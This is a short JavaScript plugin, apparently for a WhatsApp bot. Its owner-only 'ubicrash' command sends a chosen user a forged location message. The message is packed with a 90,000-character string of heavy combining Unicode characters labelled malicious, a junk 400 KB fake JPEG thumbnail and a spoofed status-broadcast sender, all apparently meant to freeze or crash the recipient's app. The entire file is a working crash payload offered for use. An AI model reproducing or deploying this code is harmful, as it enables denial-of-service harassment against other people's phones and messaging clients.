let handler = async (m, { conn }) => {
  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat;
  if (jid === conn.user.id) {
    return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m });
  }

  const objetivo = jid;

  // Carácter malicioso
  const caracter = 'ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵';
  const textoLargo = caracter.repeat(Math.floor(90000 / caracter.length)).slice(0, 90000);

  // 🧪 Crea una imagen JPEG falsa de 400 KB
  const header = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]); // JPEG header
  const fill = Buffer.alloc(400 * 1024 - header.length, 0xFF); // Relleno con 0xFF
  const fakeImage = Buffer.concat([header, fill]);

  const fakeLoc = {
    key: {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(m.chat ? { remoteJid: "status@broadcast" } : {})
    },
    message: {
      locationMessage: {
        name: 'C•137DOMINA+ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵',
        degreesLatitude: 19.432608,
        degreesLongitude: -99.133209,
        address: textoLargo,
        jpegThumbnail: fakeImage,
        isLive: false
      }
    }
  };

  await conn.relayMessage(objetivo, fakeLoc.message, { messageId: conn.generateMessageTag() });
};

handler.command = /^ubicrash|ubipesada$/i;
handler.owner = true;

export default handler;